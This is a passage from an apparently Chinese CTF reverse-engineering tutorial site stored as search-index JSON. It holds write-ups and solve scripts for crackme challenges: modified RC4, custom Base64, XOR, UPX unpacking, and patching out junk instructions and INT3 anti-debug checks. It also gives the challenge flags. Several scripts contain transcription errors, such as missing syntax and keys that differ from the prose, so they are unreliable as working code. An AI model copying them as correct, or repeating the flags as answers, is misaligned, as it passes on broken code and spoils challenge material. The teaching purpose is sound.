<p>\u8ddf\u8fdb\u4e0b\u9762\u7684\u51fd\u6570\u53d1\u73b0\u662f\u4e2a\u9b54\u6539\u7684 RC4</p> <p></p> \u6807\u51c6 RC4 \u7279\u5f81 \u6b64\u4ee3\u7801\u7279\u5f81 <code>j = (j + S[i] + K[i % keylen]) % 256</code> <code>v5 = (v9[k] + v5 + *(k + a1)) % 233</code> \u4ea4\u6362 S[i] \u4e0e S[j] \u540c\u6837\u4ea4\u6362 <code>(k + a1)</code> \u4e0e <code>(v5 + a1)</code> \u6a21\u6570 256 \u9b54\u6539\u6210\u4e86 233 \u5355\u6b21\u5faa\u73af 256 \u6b21 \u8fd9\u91cc\u5c45\u7136 \u91cd\u590d 3 \u6b21\uff08<code>for (j = 0; j &lt; 3; ++j)</code>\uff09 <p>\u5199\u811a\u672c\u89e3\u5bc6\u5373\u53ef</p> <pre><code>def KSA(key):   \n    S = list(range(256))   \n    v5 = 0\n    for _ in range(3):    \nfor k in range(256):   \n            v5 = (key[k % len(key)] + v5 + S[k]) % 233\n            S[k], S[v5] = S[v5], S[k]   \n    return S   \n\ndef PRGA(S):\n    i, j = 0, 0\n    whileTrue:   \n        i = (i + 1) % 256\n        j = (j + S[i]) % 256\n        S[i], S[j] = S[j], S[i]   \n        K = S[(S[i] + S[j]) % 256]   \n        yield K   \n\ndef RC4(key, ciphertext):\n    cipher_bytes = bytes(ciphertext)   \n    S = KSA(key)   \n    keystream = PRGA(S)   \n    return bytes([c ^ next(keystream) for c in cipher_bytes])   \n\nkey = b'forpalu'\nenc = [13, 176, 191, 10, 141, 47, 2, 56, 111, 25, 174, 153, 25, 199,   \n            110, 247, 79, 203, 144, 78, 85, 142, 209, 16, 192]   \n\nflag = RC4(key, enc)   \nprint(flag.decode())\n#palu{G00d_P1au_Kn0w_H00K}\n</code></pre>"},{"location":"Reverse/Chapter5/5-2/","title":"\u5b57\u7b26\u66ff\u6362\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-2/#\u5b57\u7b26\u66ff\u6362\u7834\u89e3","title":"\u5b57\u7b26\u66ff\u6362\u7834\u89e3","text":"<p>\u53cd\u7f16\u8bd1\u53d1\u73b0\u8f93\u5165\u503c\u4e0e Str2 \u505a\u4e86\u6bd4\u8f83</p> <p></p> <p>\u53cc\u51fb Str2 \u62ff\u5230\u5b57\u7b26\u4e32 {hello_world}</p> <p></p> <p>\u770b\u5230\u4e0a\u9762\u6709\u4e00\u4e2a\u66ff\u6362\u6b65\u9aa4\uff0c\u4e5f\u5c31\u662f\u5c06 o \u66ff\u6362\u4e3a\u4e86 0\uff0c\u6240\u4ee5 flag{hell0_w0rld}</p> <p></p>"},{"location":"Reverse/Chapter5/5-3/","title":"\u79fb\u4f4d\u8fd0\u7b97\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-3/#\u79fb\u4f4d\u8fd0\u7b97\u7834\u89e3","title":"\u79fb\u4f4d\u8fd0\u7b97\u7834\u89e3","text":"<p>\u5982\u679c Dest \u548c Str2 \u524d v5 \u4e2a\u5b57\u8282\u76f8\u540c\uff0c\u5219\u5f97\u5230\u7684\u662f\u6b63\u786e\u7684 flag\uff0c\u800c v5 \u5c31\u662f Dest \u7684\u957f\u5ea6\uff0c\u4e5f\u5c31\u662f\u8981 Dest = Str2</p> <p></p> <p>\u62ff\u5230 Str2 \u7684\u5b57\u7b26</p> <p></p> <p>\u518d\u5f80\u4e0a\u770b\uff0cfor \u5faa\u73af\u5bf9 Dest \u8fdb\u884c\u4fee\u6539\uff0c\u7b2c j \u4f4d\u5143\u7d20\u7684 ASCII \u52a0\u4e0a j\uff0c\u90a3\u4e48\u6211\u4eec\u7834\u89e3\u5c31\u5faa\u73af\u51cf\u53bb \uff0c\u518d\u5f80\u4e0a\u770b\u8c03\u7528\u4e86 sub_4110BE \u51fd\u6570</p> <p></p> <p>\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u8fdb\u53bb\u770b\u770b\u53d1\u73b0\u7c7b\u4f3c Base64 \u7f16\u7801</p> <p></p> <p>\u53cc\u51fb aA\u2026\u2026\u2026\u2026 \u770b\u5230\u5e38\u89c4\u7684 Base64 \u7f16\u7801\u8868</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u7834\u89e3</p> <pre><code>import base64\n\nstr2 = 'e3nifIH9b_C@n@dH'\n\nrawDest = ''\n\nfor i in range(len(str2)):\n    rawDest += chr(ord(str2[i]) - i)\n\nprint(base64.b64decode(rawDest))\n</code></pre>"},{"location":"Reverse/Chapter5/5-4/","title":"\u5b57\u7b26\u4e32\u7206\u7834","text":""},{"location":"Reverse/Chapter5/5-4/#\u5b57\u7b26\u4e32\u7206\u7834","title":"\u5b57\u7b26\u4e32\u7206\u7834","text":"<p>\u6254\u5230 IDA64 \u53cd\u7f16\u8bd1\uff0c\u770b\u5230\u5148\u8c03\u7528\u4e86 Decry \u52a0\u5bc6\u51fd\u6570</p> <p></p> <p>\u5012\u7740\u770b\u662f\u6bd4\u8f83 text \u4e0e str2 \u7684\u503c</p> <p></p> <p>\u5f80\u4e0a\u770b\u627e\u5230\u5173\u4e8e str2 \u7b97\u6cd5\uff0cv2 \u521d\u59cb\u503c\u662f 0\uff0c\u8fd9\u91cc\u5e94\u8be5\u662f\u904d\u5386 str2 \u7684\u6bcf\u4e2a\u5b57\u7b26\uff0cv1 \u53c8\u662f\u8bfb\u53d6\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u6682\u65f6\u4e0d\u7ba1</p> <p>v3 \u521d\u59cb\u503c\u4e3a 0\uff0cv5 \u662f key \u7684\u957f\u5ea6\uff0c\u73b0\u5728\u672a\u77e5\u7684\u662f key\uff0c\u53bb\u627e key</p> <p></p> <p>strcpy() \u5c06 key1 \u590d\u5236\u7ed9 key\uff0cstrcat() \u5c06 src \u62fc\u5728 key \u540e\u9762</p> <p></p> <p>\u53cc\u51fb key1 \u62ff\u5230\u5b57\u7b26\u4e32</p> <p></p> <p>src \u7684\u503c\u662f\u4ee5\u5341\u516d\u8fdb\u5236\u7684\u5f62\u5f0f\u7ed9\u51fa</p> <p></p> <p>\u5728\u7ebf\u7f51\u7ad9\u8f6c ASCII \u7801\uff0c\u6ce8\u610f\u8981\u98a0\u5012\u987a\u5e8f</p> <p>\u6570\u636e\u5728\u5185\u5b58\u4e2d\u662f\u5c0f\u7aef\u987a\u5e8f\uff0c\u9ad8\u4f4d\u5728\u9ad8\u5730\u5740\u5904\uff0c\u4f4e\u4f4d\u5728\u4f4e\u5730\u5740\u5904</p> <p>\u6545\u5b9e\u9645\u7684\u5b57\u7b26\u987a\u5e8f\u5e94\u4e3a \"NDCLS</p> <p></p> <p>\u8fd8\u6709\u4e00\u5904\u5173\u4e8e key \u7684\u7b97\u6cd5\uff0c\u904d\u5386 key \u4e2d\u7684\u5b57\u7b26\uff0c\u56e0\u4e3a v3 = 0\uff0cv5 = 10\uff0c\u6240\u4ee5 if \u6761\u4ef6\u6210\u7acb</p> <p>\u770b\u5230 + 32 \u63a8\u6d4b\u662f\u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 ASCII \u8868\uff0cA = 65\uff0c a = 97\uff0c\u6240\u4ee5\u6700\u540e key = \"adsfkndcls\"</p> <p></p> <p>\u73b0\u5728\u6765\u770b text\uff0cjoin() \u4e0e strcat() \u540c\u7406</p> <p></p> <p>\u540c\u7406\u89e3\u51fa v9 = \"hadow\"</p> <p></p> <p>\u62ff\u5230 key3 = \"kills\"\uff0c\u6240\u4ee5 text = \"killshadow\"</p> <p></p> <p>\u56e0\u4e3a str2 \u8fd8\u6709\u4e2a v1 \u53c2\u6570\u662f\u672a\u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u904d\u5386\u7206\u7834 str2 \u4e0e text \u6bd4\u8f83\uff0c\u6210\u529f\u62ff\u5230 flag</p> <pre><code>text = 'killshadow'\nkey = 'adsfkdcls'\n\nv3 = 0\nv5 = len(key)\ndict1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nflag = ''\n\nfor i in range(0, 10):\n    for char in dict1:\n        x = (ord(char) - 39 - ord(key[v3 % v5] + 97) % 26 + 97\n        if chr(x) == text[i]:\n            flag += char\n\n        v3 += 1\n\nprint(flag)\n</code></pre>"},{"location":"Reverse/Chapter5/5-5/","title":"\u5f02\u6216\u8fd0\u7b97\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-5/#\u5f02\u6216\u8fd0\u7b97\u7834\u89e3","title":"\u5f02\u6216\u8fd0\u7b97\u7834\u89e3","text":"<p>\u6254\u8fdb IDA32 \u91cc\u53cd\u7f16\u8bd1 main \u4e0d\u884c\uff0c\u5148\u8fdb sub_401020 \u4e2d\u53cd\u7f16\u8bd1</p> <p></p> <p>\u8fd9\u4e2a\u65f6\u5019\u518d\u53cd\u7f16\u8bd1 main \u5c31\u53ef\u4ee5\u4e86\uff0c\u5012\u7740\u770b\u662f\u505a\u4e86\u4e00\u4e2a\u5f02\u6216\u8fd0\u7b97\uff0c\u6211\u4eec\u9700\u8981 byte_41EA08 \u7684\u503c</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u5176\u503c\uff0c\u800c byte_4212C0 \u662f\u6211\u4eec\u8f93\u5165\u7684\u503c\uff0c\u6211\u4eec\u77e5\u9053\u5982\u679c\u5f02\u6216\u540c\u4e00\u4e2a\u6570\u503c\u7ed3\u679c\u4e0d\u53d8</p> <p></p> <p>\u5199\u811a\u672c\u5f02\u6216\u56de\u53bb\u62ff\u5230 flag</p> <pre><code>a = \"MSAWB~FXZ:J:`tQJ\\\"N@ bpdd}8g\"\n\ns = \"\"\n\nfor i in range(len(a)):\n    s += chr(i ^ ord(a[i]))\n\nprint(s)\n</code></pre>"},{"location":"Reverse/Chapter5/5-6/","title":"Base64 \u6362\u8868\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-6/#base64-\u6362\u8868\u7834\u89e3","title":"Base64 \u6362\u8868\u7834\u89e3","text":"<p>PE \u68c0\u6d4b\u6ca1\u6709\u58f3</p> <p></p> <p>\u53d1\u73b0 Base64 \u7f16\u7801</p> <p></p> <p>\u6b63\u5e38\u89e3\u7801\u662f\u4e71\u7801\uff0c\u4e00\u5b9a\u662f\u6362\u8868\u4e86\uff0c\u53bb\u641c\u7d22\u5b57\u7b26\u4e32</p> <p></p> <p>\u53d1\u73b0\u5728\u51fd\u6570\u5217\u8868\u4e2d\uff0c\u6709\u4e00\u4e2aLookAtYou\uff0c\u539f\u6765\u662f\u628a\u5bc6\u7801\u8868\u6539\u4e86</p> <p></p> <p>\u5148\u7b97\u51fa\u5bc6\u7801\u8868</p> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main() {\n    char v0;\n    __int64 result;\n    signed int i;\n    char base[65] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\n    for (i = 0; i &lt;= 9; ++i)\n    {\n        v0 = base[i];\n        base[i] = base[19 - i];\n        result = 19 - i;\n        base[result] = v0;\n    }\n    printf(\"%s\\n\", base);\n    return 0;\n}\n// TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n</code></pre> <p>\u7136\u540e\u6362\u8868\u7834\u89e3</p> <pre><code>import base64\n\nstr_1 = \"d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\"\nstr_base = \"TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\nstr_zh_base = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\nflag = base64.b64decode(str_1.translate(str.maketrans(str_base,str_zh_base)))\n\nprint(flag)\n# wctf2020{Base64_is_the_start_of_reverse}'\n</code></pre>"},{"location":"Reverse/Chapter5/5-7/","title":"\u591a\u7ebf\u7a0b\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-7/#\u591a\u7ebf\u7a0b\u7834\u89e3","title":"\u591a\u7ebf\u7a0b\u7834\u89e3","text":"<p>\u53d1\u73b0\u6709\u58f3</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u8131\u58f3</p> <p></p> <p>\u76f4\u63a5\u8fdb\u5165 main \u51fd\u6570</p> <p>\u9996\u5148\u8c03\u7528\u4e86 sub_4110FF()\uff0c\u53bb\u770b\u770b</p> <p></p> <p>\u53c8\u662f\u4e00\u4e2a\u8c03\u7528</p> <p></p> <p>\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u503c</p> <p></p> <p>\u56de\u5230 main \u51fd\u6570\uff0c\u5b83\u5f80\u4e0b\u521b\u5efa\u4e86\u4e24\u4e2a\u7ebf\u7a0b</p> <pre><code>hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);\nThread = CreateThread(0, 0, sub_41119F, 0, 0, 0);\nCloseHandle(hObject);\nCloseHandle(Thread);\n</code></pre> <p>\u5148\u53bb\u770b\u770b StartAddress</p> <p></p> <p>\u8ddf\u8fdb\u53bb\u770b\u5230\u8c03\u7528\u4e86 sub_41112c</p> <p></p> <p>\u8ddf\u8fdb\u53bb\u53d1\u73b0\u53c8\u662f\u8c03\u7528</p> <p></p> <p>\u518d\u8ddf\u8fdb\u53bb\u5c31\u662f\u7b97\u6cd5\u4e86</p> <p></p> <p>\u56de\u5934\u518d\u770b\u7b2c\u4e8c\u4e2a\u7ebf\u7a0b</p> <p></p> <p>\u8ddf\u8fdb\u53bb</p> <p></p> <p>\u67e5\u770b dword_41808 \u7684\u503c\u662f 29</p> <p></p> <p>\u7ed3\u5408\u8d77\u6765\u770b\u5148\u8c03\u7528 StartAddress \u51fd\u6570\u7136\u540e dword_418008 -1</p> <p>\u4f46\u5982\u56fe\u7b2c\u4e8c\u4e2a\u7ebf\u7a0b\u4e2d\u7684\u51fd\u6570 sub_41119F \u4e0d\u4f1a\u8c03\u7528 sub_41112C \u8fd9\u4e2a\u51fd\u6570\uff0c\u800c\u662f\u76f4\u63a5\u628a\u8ba1\u6570\u503c\u51cf\u4e00</p> <p>\u8fd9\u5c31\u610f\u5473\u7740\u8f93\u5165\u7684 flag \u91cc\u53ea\u6709\u4e00\u534a\u7684\u5b57\u7b26\u4f1a\u901a\u8fc7 sub_41112C \u88ab\u53d8\u6362\uff0c\u5176\u4f59\u7684\u4e00\u534a\u4e0d\u4f1a\u53d8</p> <p>\u53bb\u67e5\u627e 0ff_418000 \u7684\u503c</p> <p></p> <p>\u6700\u540e\u8fd8\u8c03\u7528\u4e86\u51fd\u6570\uff0c\u8ddf\u8fdb\u53bb</p> <p></p> <p>\u53d1\u73b0\u662f\u4e0e off_418004 \u505a\u4e86\u6bd4\u8f83</p> <p></p> <p>\u53bb\u627e off_418004 \u7684\u503c</p> <p></p> <p>\u7f16\u5199\u811a\u672c</p> <pre><code>off_418000 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\noff_418004 = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\n\nflag=''\n\nfor i in range(len(off_418004)):\n    if i % 2 == 0:\n        flag += off_418004[i]\n        continue\n\n    for j,k in enumerate(off_418000):\n        if off_418004[i] == k:\n            if chr(j+38).isupper():\n                flag += chr(j+38)\n            else:\n                flag += chr(j+96)\n\nprint(flag)\n\n# flag{ThisisthreadofwindowshahaIsESE}\n# \u6211\u4eec\u9700\u8981\u518d\u5f97\u5230\u7684\u5b57\u7b26\u4e32\u540e\u9762\u5728\u52a0\u4e00\u4f4d\uff0cbuu \u4e0a\u9700\u8981\u52a0 E\n</code></pre>"},{"location":"Reverse/Chapter5/5-8/","title":"\u5b57\u7b26\u8bfb\u53d6\u957f\u5ea6\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-8/#\u5b57\u7b26\u8bfb\u53d6\u957f\u5ea6\u7834\u89e3","title":"\u5b57\u7b26\u8bfb\u53d6\u957f\u5ea6\u7834\u89e3","text":"<p>\u5148\u8fd0\u884c\u5565\u4e5f\u6ca1\u6709</p> <p></p> <p>\u6254 IDA \u4e2d\u89e3\u6790\u770b\u5230\u6709\u53d6\u5730\u5740 &amp;unk_402008</p> <p></p> <p>\u67e5\u770b\u5176\u5730\u5740</p> <p></p> <p>\u653e\u7740\u5927\u91cf\u5b57\u7b26\uff0c\u4f46\u662f\u540e\u9762 28 \u5e94\u8be5\u662f\u53d6\u7684\u957f\u5ea6\uff0c\u67e5\u770b\u5176\u6c47\u7f16\u4ee3\u7801</p> <p></p> <p>\u4fee\u6539\u5176\u503c</p> <p></p> <p>\u4fdd\u5b58</p> <p></p> <p>\u518d\u6b21\u8fd0\u884c\u53d1\u73b0\u5b57\u7b26\u53d8\u5c11\u4e86\uff0c\u8bf4\u660e v6 \u662f\u4e00\u4e2a\u8bfb\u53d6\u5b57\u7b26\u4e32\u7684\u51fd\u6570</p> <p></p> <p>\u5c06\u5176\u4fee\u6539\u4e3a\u5b9e\u9645\u957f\u5ea6 0xAF\uff0c\u4fdd\u5b58\u8fd0\u884c\u62ff\u5230 flag</p> <p></p>"},{"location":"Reverse/Chapter5/5-9/","title":"!= \u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-9/#-\u7834\u89e3","title":"!= \u7834\u89e3","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\uff0c\u5148\u770b\u6b63\u786e\u7684\u53cd\u7f16\u8bd1\u540e\u7684\u4f2a\u4ee3\u7801</p> <p></p> <p>\u8fd9\u91cc sub_4007c0 \u662f\u5931\u8d25\u7684\u51fd\u6570\uff0c\u5b8c\u6574\u7684\u4f2a\u4ee3\u7801\u5982\u4e0b</p> <p>\u53ef\u4ee5\u770b\u5230\u5168\u7b49\u540e\u5c31\u8df3\u51fa\u4e86 for \u5faa\u73af\u8fdb\u5165\u6210\u529f\u7684\u51fd\u6570\uff08\u73af\u5883\u95ee\u9898\uff0c\u6838\u5fc3\u90e8\u5206\u770b\u4e0a\u9762\uff09</p> <p></p> <p>\u9996\u5148\u770b <code>v7</code> \u7684\u503c</p> <pre><code>__int64 v7;\nv7 = 0x65 62 6D 61 72 61 68LL;\n</code></pre> <p>\u6240\u4ee5 <code>v7</code> \u7684\u9996\u5730\u5740\u5904\u5b58\u7684\u662f 0x68\uff0c\u4ee5\u6b64\u7c7b\u63a8</p> <pre><code>*((_BYTE *)&amp;v7 + 0 % v6) = 0x68\n\n*((_BYTE *)&amp;v7 + 1 % v6) = 0x61\n\n*((_BYTE *)&amp;v7 + 2 % v6) = 0x72\n\n*((_BYTE *)&amp;v7 + 3 % v6) = 0x61\n\n*((_BYTE *)&amp;v7 + 4 % v6) = 0x6D\n\n*((_BYTE *)&amp;v7 + 5 % v6) = 0x62\n\n*((_BYTE *)&amp;v7 + 6 % v6) = 0x65\n</code></pre> <p>\u6839\u636e <code>(char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</code> \uff0c\u6c42\u89e3\u51fa <code>s[i]</code> \u5e76\u8f93\u51fa\uff0c\u5f97\u5230 flag</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;string.h&gt;\nusing namespace std;\nint main() {\n    string v8 = \":\\\"AL_RT^L*.?+6/46\";\n    __int64 v7 = 0x65626D61726168LL;\n    int key[] = {0x68,0x61,0x72,0x61,0x6d,0x62,0x65};\n    int v9 = 0,v6 = 7;\n    string flag = \"\";\n    for (int i = 0; i &lt; v8.length(); ++i )\n    {\n        flag += (char)(key[i % v6] ^ v8[i]);\n    }\n    cout&lt;&lt;flag;     // RC3-2016-XORISGUD\n    return 0;\n}\n</code></pre>"},{"location":"Reverse/Chapter6/6-1/","title":"\u4e07\u80fd\u8131\u58f3\u5de5\u5177","text":""},{"location":"Reverse/Chapter6/6-1/#\u4e07\u80fd\u8131\u58f3\u5de5\u5177","title":"\u4e07\u80fd\u8131\u58f3\u5de5\u5177","text":"<p>\u4f7f\u7528 Exeinfo PE \u53d1\u73b0\u6709\u58f3</p> <p></p> <p>\u8131\u58f3\u5de5\u5177\u8131\u58f3</p> <p></p> <p>\u6254\u8fdb IDA \u53cd\u7f16\u8bd1\u62ff\u5230 flag</p> <p></p>"},{"location":"Reverse/Chapter6/6-2/","title":"UPX \u8131\u58f3","text":""},{"location":"Reverse/Chapter6/6-2/#upx-\u8131\u58f3","title":"UPX \u8131\u58f3","text":"<p>\u653e\u5165 Exeinfo PE \u4e2d\u53d1\u73b0\u6709 upx \u58f3</p> <p></p> <p>\u5728 Kali \u4e2d\u4f7f\u7528 UPX \u8131\u58f3</p> <p></p> <p>\u5728\u653e\u5165 Exeinfo PE \u4e2d\u53d1\u73b0\u6ca1\u58f3\u4e86</p> <p></p> <p>\u6254 IDA32 \u4e2d\u53cd\u7f16\u8bd1\uff0c\u9996\u5148\u662f v4 = \"*F'\\\"N,\\\"(I?+@\"</p> <p></p> <p>\u62ff\u5230 data_start_ \u7684\u503c</p> <p></p> <p>\u5728 data_start_ \u5b57\u7b26\u4e32\u91cc\u9762\u5bfb\u627e\u4e00\u4e2a\u5b57\u7b26\u7136\u540e -1 \u4e0e v4 \u8fdb\u884c\u5bf9\u6bd4</p> <pre><code>v4 = [42,70,39,34,78,44,34,40,73,63,43,64]\ns = ''\nflag = ''\n__data_strart__ = '~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\\'&amp;%$# !\"'\n\nfor i in v4:\n    s += chr(__data_strart__.find(chr(i))+1)\n    print(s)\n</code></pre>"},{"location":"Reverse/Chapter7/7-1/","title":"\u82b1\u6307\u4ee4\u7834\u89e3","text":""},{"location":"Reverse/Chapter7/7-1/#\u82b1\u6307\u4ee4\u7834\u89e3","title":"\u82b1\u6307\u4ee4\u7834\u89e3","text":"<p>\u67e5\u58f3\u53d1\u73b0 UPX</p> <p></p> <p>\u4e07\u80fd\u5de5\u5177\u8131\u58f3</p> <p></p> <p>\u6254\u8fdb IDA32 \u4e2d\u53cd\u7f16\u8bd1\u53d1\u73b0\u62a5\u9519\uff0cjnz \u6307\u4ee4\u8df3\u8f6c\u5230\u4e86\u4e0b\u4e00\u884c\u4ee3\u7801\uff0c\u5373 call \u6307\u4ee4\uff0c\u4f46\u662f\u8fd9\u4e2a\u5730\u5740\u4e0d\u5b58\u5728\uff0c\u63a8\u6d4b\u6dfb\u52a0\u4e86\u82b1\u6307\u4ee4\uff0c\u5bfc\u81f4 IDA \u5206\u6790\u5931\u8d25</p> <p></p> <p>\u82b1\u6307\u4ee4\u7ed5\u8fc7\u5c31\u662f\u628a\u8fd9\u4e00\u6bb5\u6539\u4e3a NOP \u5373\u53ef\uff0c\u9f20\u6807\u5149\u6807\u505c\u5728 0x401020C \u90a3\uff0c\u5728\u7f16\u8f91\u4e2d\u4fee\u6539\u5b57\u8282</p> <p></p> <p>C \u5230 F \u4e3a\u4e09\u4e2a\u5b57\u8282\uff0c\u4fee\u6539\u4e3a 90\uff0c0x90 \u4ee3\u8868\u6307\u4ee4 NOP</p> <p></p> <p>\u4fee\u6539\u540e\u5982\u4e0b</p> <p></p> <p>\u540c\u6837\u7684\u4f4d\u7f6e\u9009\u62e9\u6700\u540e\u4e00\u4e2a\u4fdd\u5b58</p> <p></p> <p>\u518d\u91cd\u65b0\u6253\u5f00\u5c31\u53ef\u4ee5\u6b63\u5e38\u53cd\u7f16\u8bd1 main \u4e86\uff0c\u770b\u5230 case wsad \u4e00\u773c\u8ff7\u5bab\u9898</p> <p></p> <p>\u70b9\u8fdb\u53bb\u5c31\u80fd\u62ff\u5230\u8ff7\u5bab\u7684\u5b57\u7b26\u4e32</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u6253\u5370\u8ff7\u5bab\u56fe\uff0c\u56e0\u4e3a\u957f\u5ea6\u4e3a 70\uff0c\u63a8\u6d4b\u8981\u4e48 7 * 10\uff0c\u8981\u4e48 10 * 7</p> <pre><code>def main():\n    maze = \"*******+********* ******    ****   ******* **F******    **************\"\n    print(len(maze))\n    eid = maze.index(\"F\")\n    ex, ey = -4, 5\n    c = (eid - ey) // (-ex)\n    r = len(maze) // c\n    for i in range(r):\n        print(maze[c * i:c * (i + 1)])\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"Reverse/Chapter7/7-2/","title":"INT3 \u53cd\u8c03\u8bd5\u7834\u89e3","text":""},{"location":"Reverse/Chapter7/7-2/#int3-\u53cd\u8c03\u8bd5\u7834\u89e3","title":"INT3 \u53cd\u8c03\u8bd5\u7834\u89e3","text":"<p>32IDA \u6253\u5f00</p> <p></p> <p>\u7ed9\u51fa\u4e86 if \u7ed3\u6784\uff0c\u6211\u4eec\u76f4\u63a5\u6253\u5f00\u7684\u8bdd\u662f\u6267\u884c\u662f\u7b2c\u4e00\u90e8\u5206\uff0c\u7ed9\u51fa\u4e86\u4e71\u7801</p> <p></p> <p>\u6240\u4ee5\u6211\u4eec\u8981\u8ba9\u7a0b\u5e8f\u8d70\u7b2c\u4e8c\u90e8\u5206\uff0c\u5728 OllyDbg \u4e2d\u8f7d\u5165\u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u76f4 F8 \u5355\u6b65\u5411\u4e0b\u627e\u5230\u5f39\u7a97\u7684\u4f4d\u7f6e</p> <p></p> <p>\u5728\u5f39\u7a97\u4f4d\u7f6e\u8fd9\u91cc\u4e0b\u65ad\u70b9\u6309 F2</p> <p></p> <p>\u6309 Ctrl+F2 \u91cd\u65b0\u8f7d\u5165</p> <p></p> <p>\u6309 F9 \u76f4\u63a5\u8fd0\u884c\u5230\u65ad\u70b9\u4f4d\u7f6e</p> <p></p> <p>\u56e0\u4e3a\u4e0b\u4e00\u6b65\u5c31\u5f39\u7a97\u4e86\uff0c\u6240\u4ee5\u8fd9\u91cc\u5f97 F7 \u6b65\u5165\u8fdb\u53bb</p> <p> </p> <p>\u5230\u8fd9\u91cc\u6267\u884c\u53c8\u5f39\u7a97\u4e86</p> <p></p> <p>\u91cd\u65b0\u6267\u884c\u4e00\u904d\u53d1\u73b0\u6267\u884c\u4e86\u8fd9\u6761\u6307\u4ee4\u8df3\u8f6c\u5230\u4e86\u8fd9\u91cc\uff0c\u4e0b\u65ad\u70b9\u9a8c\u8bc1\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837</p> <p></p> <p>\u4f46\u662f\u4e0a\u9762\u8fd8\u6709\u4e00\u6761 JNZ \u6307\u4ee4\u5e76\u672a\u6267\u884c\uff0c\u91cd\u65b0\u6253\u65ad\u70b9\u5220\u9664\u65ad\u70b9</p> <p></p> <p>\u6211\u8fd9\u91cc\u662f\u76f4\u63a5\u6539\u4e3a <code>JMP</code> \u5f3a\u5236\u8df3\u8f6c\uff0c\u53f3\u952e\u6c47\u7f16\u6216\u8005\u76f4\u63a5\u7a7a\u683c</p> <p>\u5176\u4ed6\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <ol> <li>\u76f4\u63a5\u4fee\u6539 <code>EAX</code> \u4e3a\u975e\u96f6\u503c</li> </ol> <pre><code>MOV EAX, 1      ; EAX \u2260 0 \u2192 TEST EAX,EAX \u540e ZF=0 \u2192 JNZ \u8df3\u8f6c\n</code></pre> <ol> <li>\u76f4\u63a5\u4fee\u6539 <code>EFLAGS</code>\uff08<code>Z</code> \u6807\u5fd7\u4f4d\uff09</li> </ol> <pre><code>PUSHFD          ; \u5c06 EFLAGS \u538b\u6808\nAND DWORD PTR [ESP], ~0x40  ; \u6e05\u9664 ZF\uff08\u7b2c 6 \u4f4d\uff09\nPOPFD           ; \u6062\u590d\u4fee\u6539\u540e\u7684 EFLAGS\n</code></pre> <p></p> <p>\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\u53f3\u952e\u4fee\u6539\u7684\u6307\u4ee4 -&gt; \u7f16\u8f91 -&gt; \u590d\u5236\u6240\u6709\u4fee\u6539\u5230\u53ef\u6267\u884c\u6587\u4ef6</p> <p></p> <p>\u76f4\u63a5\u66ff\u6362\u6389\u539f\u59cb\u6587\u4ef6</p> <p></p> <p>\u8fd9\u91cc\u6709\u4e2a <code>INT3</code> \u53cd\u8c03\u8bd5\uff0c<code>nop</code> \u6389</p> <p></p> <p>\u7ee7\u7eed F8 \u8d70\u5230\u8fd9\u91cc\u540e\u53c8\u6ca1\u6709\u7ed3\u679c\u4e86\uff0c\u518d\u6b21 <code>nop</code> \u6389</p> <p></p> <p>\u7ee7\u7eed F8 \u8d70\u5230 <code>call Message</code> \u8fd9\u91cc\u5f39\u7a97\u4e86\uff0c\u5ffd\u7565\u540e\u7ee7\u7eed\u8d70</p> <p>\u4e0b\u9762\u90a3\u4e2a <code>JMP</code> \u6ca1\u6709\u7ed3\u679c\u4e86\uff0c\u4e00\u6837 <code>nop</code></p> <p></p> <p>\u8d70\u5230\u8fd9\u4e00\u6b65\u65f6 flag \u5df2\u7ecf\u51fa\u6765\u4e86</p> <p></p> <p>\u770b\u6307\u4ee4 <code>PUSH EAX</code> \u5e94\u8be5\u662f\u5c06 flag \u653e\u5165\u4e86 <code>EAX</code> \u4e2d\uff0c\u53f3\u952e\u8ddf\u968f\u503c\u53ef\u4ee5\u5728\u53f3\u4e0b\u89d2\u770b\u5230 flag</p> <p></p> <p>\u5f80\u540e\u9762\u7ee7\u7eed\u8d70\u4e5f\u662f\u5f39\u7a97\u7ed9\u51fa\u4e86 flag</p> <p></p>"},{"location":"Reverse/Chapter8/8-1/","title":"GDB 